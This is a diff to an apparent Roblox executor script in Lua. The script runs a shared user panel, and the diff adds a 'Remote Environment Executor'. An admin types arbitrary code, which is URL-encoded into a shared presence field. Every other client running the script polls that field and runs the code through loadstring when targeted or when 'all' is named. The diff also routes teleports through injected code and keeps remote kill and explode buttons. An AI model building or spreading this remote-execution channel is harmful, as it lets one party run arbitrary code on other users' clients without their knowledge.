@@ -54,6 +54,14 @@ local function getExecutor()
 end
 local myExecutor = getExecutor()
 
+local function cleanUrlDecode(str)
+    str = string.gsub(str, "+", " ")
+    str = string.gsub(str, "%%(%x%x)", function(hex)
+        return string.char(tonumber(hex, 16))
+    end)
+    return str
+end
+
 local function parseIsoToUnix(isoStr)
     if not isoStr or type(isoStr) ~= "string" then return 0 end
     local year, month, day, hour, min, sec = isoStr:match("(%d+)-(%d+)-(%d+)[T ](%d+):(%d+):(%d+)")
@@ -180,6 +188,7 @@ local TextBox = Instance.new("TextBox")
 TextBox.Size = UDim2.new(1, 0, 0, 38); TextBox.Position = UDim2.new(0, 0, 1, -38); TextBox.BackgroundColor3 = Color3.fromRGB(56, 58, 64); TextBox.TextColor3 = Color3.fromRGB(219, 222, 225); TextBox.Font = Enum.Font.Gotham; TextBox.TextSize = 14; TextBox.TextXAlignment = Enum.TextXAlignment.Left; TextBox.ClearTextOnFocus = true; TextBox.Parent = ChatView
 Instance.new("UIPadding", TextBox).PaddingLeft = UDim.new(0, 12); Instance.new("UICorner", TextBox).CornerRadius = UDim.new(0, 6)
 
+-- --- EXECUTOR PANEL MANAGEMENT ---
 local ExecPanelFrame = Instance.new("Frame")
 ExecPanelFrame.Size = UDim2.new(1, -20, 1, -20); ExecPanelFrame.Position = UDim2.new(0, 10, 0, 10); ExecPanelFrame.BackgroundTransparency = 1; ExecPanelFrame.Visible = false; ExecPanelFrame.Parent = ViewContainer
 
@@ -217,6 +226,20 @@ Instance.new("UICorner", RemoteKillBtn).CornerRadius = UDim.new(0, 4)
 local RemoteExplodeBtn = Instance.new("TextButton")
 RemoteExplodeBtn.Size = UDim2.new(1, -145, 0, 28); RemoteExplodeBtn.Position = UDim2.new(0, 135, 0, 70); RemoteExplodeBtn.BackgroundColor3 = Color3.fromRGB(230, 126, 34); RemoteExplodeBtn.Text = "Remote Explode"; RemoteExplodeBtn.TextColor3 = Color3.fromRGB(255, 255, 255); RemoteExplodeBtn.Font = Enum.Font.GothamBold; RemoteExplodeBtn.TextSize = 11; RemoteExplodeBtn.Parent = TopActionFrame
 Instance.new("UICorner", RemoteExplodeBtn).CornerRadius = UDim.new(0, 4)
+
+local EnvironmentLabel = Instance.new("TextLabel")
+EnvironmentLabel.Size = UDim2.new(1, -20, 0, 20); EnvironmentLabel.Position = UDim2.new(0, 10, 0, 110); EnvironmentLabel.BackgroundTransparency = 1; EnvironmentLabel.Text = "Remote Environment Executor"; EnvironmentLabel.TextColor3 = Color3.fromRGB(181, 186, 193); EnvironmentLabel.Font = Enum.Font.GothamBold; EnvironmentLabel.TextSize = 11; EnvironmentLabel.TextXAlignment = Enum.TextXAlignment.Left; EnvironmentLabel.Parent = TopActionFrame
+
+local CodeScrollingContainer = Instance.new("ScrollingFrame")
+CodeScrollingContainer.Size = UDim2.new(1, -20, 1, -185); CodeScrollingContainer.Position = UDim2.new(0, 10, 0, 135); CodeScrollingContainer.BackgroundColor3 = Color3.fromRGB(30, 31, 34); CodeScrollingContainer.BorderSizePixel = 0; CodeScrollingContainer.ScrollBarThickness = 4; CodeScrollingContainer.CanvasSize = UDim2.new(2, 0, 5, 0); CodeScrollingContainer.Parent = ControlPanel
+Instance.new("UICorner", CodeScrollingContainer).CornerRadius = UDim.new(0, 5)
+
+local CodeBox = Instance.new("TextBox")
+CodeBox.Size = UDim2.new(1, -10, 1, -10); CodeBox.Position = UDim2.new(0, 8, 0, 8); CodeBox.BackgroundTransparency = 1; CodeBox.TextColor3 = Color3.fromRGB(168, 228, 125); CodeBox.Font = Enum.Font.Code; CodeBox.TextSize = 12; CodeBox.TextXAlignment = Enum.TextXAlignment.Left; CodeBox.TextYAlignment = Enum.TextYAlignment.Top; CodeBox.ClearTextOnFocus = false; CodeBox.MultiLine = true; CodeBox.PlaceholderText = "-- Type cross-game runtime script source here...\n-- Direct target environment configuration rules apply."; CodeBox.Text = ""; CodeBox.Parent = CodeScrollingContainer
+
+local RemoteExecuteCodeBtn = Instance.new("TextButton")
+RemoteExecuteCodeBtn.Size = UDim2.new(1, -20, 0, 32); RemoteExecuteCodeBtn.Position = UDim2.new(0, 10, 1, -40); RemoteExecuteCodeBtn.BackgroundColor3 = Color3.fromRGB(35, 165, 90); RemoteExecuteCodeBtn.Text = "Deploy Cross-Game Execution String"; RemoteExecuteCodeBtn.TextColor3 = Color3.fromRGB(255, 255, 255); RemoteExecuteCodeBtn.Font = Enum.Font.GothamBold; RemoteExecuteCodeBtn.TextSize = 12; RemoteExecuteCodeBtn.Parent = ControlPanel
+Instance.new("UICorner", RemoteExecuteCodeBtn).CornerRadius = UDim.new(0, 4)
 
 local function selectTab(tab)
     currentTab = tab
@@ -347,12 +370,10 @@ local function refreshUIList(data)
         end
     end
 
-    -- 1. Render Online Users
     createCategoryHeader("Online — " .. #onlineList, Color3.fromRGB(35, 165, 90))
     for _, user in ipairs(onlineList) do
         createUserRow(user, true)
 
-        -- Add online players to executor target panel
         local uName = tostring(user.username or "Unknown")
         if uName ~= Username then
             local TargetSelectorBtn = Instance.new("TextButton")
@@ -377,7 +398,6 @@ local function refreshUIList(data)
         end
     end
 
-    -- 2. Render Registered / Offline Users exclusively for Admin & SubAdmin
     if (IsAdmin or IsSubAdmin) and #offlineList > 0 then
         createCategoryHeader("Offline Registry (Admin History) — " .. #offlineList, Color3.fromRGB(110, 115, 122))
         for _, user in ipairs(offlineList) do
@@ -472,7 +492,7 @@ local function fetchData()
             
             refreshUIList(users)
             
-            -- SAFE ROLE-BASED INTERCEPTOR
+            -- EXECUTION & TELEPORT DISPATCHER
             for _, user in ipairs(users) do
                 if user.teleport_target ~= "none" and (user.teleport_target == Username or user.teleport_target == "all") then
                     if tick() - lastTeleportTime > 5 then 
@@ -484,26 +504,44 @@ local function fetchData()
                 end
 
                 if user.active_effect and user.active_effect ~= "none" then
-                    local cmdData = string.split(user.active_effect, ":")
-                    local action = cmdData[1]
-                    local target = cmdData[2]
-                    local uniqueHash = cmdData[3] 
+                    local delimiterIndex = string.find(user.active_effect, "||PAYLOAD||")
+                    if delimiterIndex then
+                        local headerPart = string.sub(user.active_effect, 1, delimiterIndex - 1)
+                        local payloadPart = string.sub(user.active_effect, delimiterIndex + 11)
+                        
+                        local cmdData = string.split(headerPart, ":")
+                        local action = cmdData[1]
+                        local target = cmdData[2]
+                        local uniqueHash = cmdData[3]
 
-                    if uniqueHash and not handledCommands[uniqueHash] then
-                        if user.is_admin == true or user.is_sub_admin == true then
-                            handledCommands[uniqueHash] = true 
-                            if action == "kill" or action == "explode" then
-                                if target == Username or target == "all" then 
-                                    runLocalExplosionEffect(Username)
+                        if uniqueHash and not handledCommands[uniqueHash] then
+                            if user.is_admin == true or user.is_sub_admin == true then
+                                handledCommands[uniqueHash] = true
+                                if action == "runcode" and (target == Username or target == "all") then
+                                    local decodedCode = cleanUrlDecode(payloadPart)
+                                    local executable, execError = loadstring(decodedCode)
+                                    if executable then
+                                        task.spawn(executable)
+                                    else
+                                        warn("Execution String Error: " .. tostring(execError))
+                                    end
                                 end
-                            elseif action == "teleport_to" and target == Username then
-                                for _, p in ipairs(Players:GetPlayers()) do
-                                    if p.Name == user.username and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
-                                        local myChar = LocalPlayer.Character
-                                        if myChar and myChar:FindFirstChild("HumanoidRootPart") then
-                                            myChar.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
-                                        end
-                                        break
+                            end
+                        end
+                    else
+                        local cmdData = string.split(user.active_effect, ":")
+                        local action = cmdData[1]
+                        local target = cmdData[2]
+                        local uniqueHash = cmdData[3] 
+
+                        if uniqueHash and not handledCommands[uniqueHash] then
+                            if user.is_admin == true or user.is_sub_admin == true then
+                                handledCommands[uniqueHash] = true 
+                                if action == "kill" or action == "explode" then
+                                    if target == Username or target == "all" then 
+                                        runLocalExplosionEffect(Username)
+                                    else 
+                                        runLocalExplosionEffect(target) 
                                     end
                                 end
                             end
@@ -558,10 +596,24 @@ end)
 TeleportToMeBtn.MouseButton1Click:Connect(function()
     if (IsAdmin or IsSubAdmin) and ADMIN_KEY ~= "" and SelectedTarget ~= "none" then
         local hash = tostring(os.time() .. math.random(1,1000))
-        _G.CurrentActiveEffect = "teleport_to:" .. SelectedTarget .. ":" .. hash
+        local code = string.format([[
+            local admin = game.Players:FindFirstChild("%s")
+            if admin and admin.Character and admin.Character:FindFirstChild("HumanoidRootPart") then
+                local myChar = game.Players.LocalPlayer.Character
+                local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
+                local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
+                if myHrp then
+                    if myHum then myHum.Sit = false end
+                    myHrp.CFrame = admin.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+                    myHrp.AssemblyLinearVelocity = Vector3.zero
+                end
+            end
+        ]], Username)
+        local payloadClean = HttpService:UrlEncode(code)
+        _G.CurrentActiveEffect = "runcode:" .. SelectedTarget .. ":" .. hash .. "||PAYLOAD||" .. payloadClean
         updatePresence()
         task.delay(4, function()
-            if _G.CurrentActiveEffect:sub(1,11) == "teleport_to" then
+            if _G.CurrentActiveEffect:sub(1,7) == "runcode" then
                 _G.CurrentActiveEffect = "none"
                 updatePresence()
             end
@@ -573,6 +625,7 @@ RemoteKillBtn.MouseButton1Click:Connect(function()
     if (IsAdmin or IsSubAdmin) and ADMIN_KEY ~= "" and SelectedTarget ~= "none" then
         local hash = tostring(os.time() .. math.random(1,1000))
         _G.CurrentActiveEffect = "kill:" .. SelectedTarget .. ":" .. hash
+        runLocalExplosionEffect(SelectedTarget)
         updatePresence()
         task.delay(3, function() 
             if _G.CurrentActiveEffect:sub(1,4) == "kill" then 
@@ -587,12 +640,30 @@ RemoteExplodeBtn.MouseButton1Click:Connect(function()
     if (IsAdmin or IsSubAdmin) and ADMIN_KEY ~= "" and SelectedTarget ~= "none" then
         local hash = tostring(os.time() .. math.random(1,1000))
         _G.CurrentActiveEffect = "explode:" .. SelectedTarget .. ":" .. hash
+        runLocalExplosionEffect(SelectedTarget)
         updatePresence()
         task.delay(3, function() 
             if _G.CurrentActiveEffect:sub(1,7) == "explode" then 
                 _G.CurrentActiveEffect = "none" 
                 updatePresence() 
             end 
+        end)
+    end
+end)
+
+RemoteExecuteCodeBtn.MouseButton1Click:Connect(function()
+    if (IsAdmin or IsSubAdmin) and ADMIN_KEY ~= "" and SelectedTarget ~= "none" and CodeBox.Text ~= "" then
+        local hash = tostring(os.time() .. math.random(1,1000))
+        local payloadClean = HttpService:UrlEncode(CodeBox.Text)
+        
+        _G.CurrentActiveEffect = "runcode:" .. SelectedTarget .. ":" .. hash .. "||PAYLOAD||" .. payloadClean
+        updatePresence()
+        
+        task.delay(4, function()
+            if _G.CurrentActiveEffect:sub(1,7) == "runcode" then
+                _G.CurrentActiveEffect = "none"
+                updatePresence()
+            end
         end)
     end
 end)
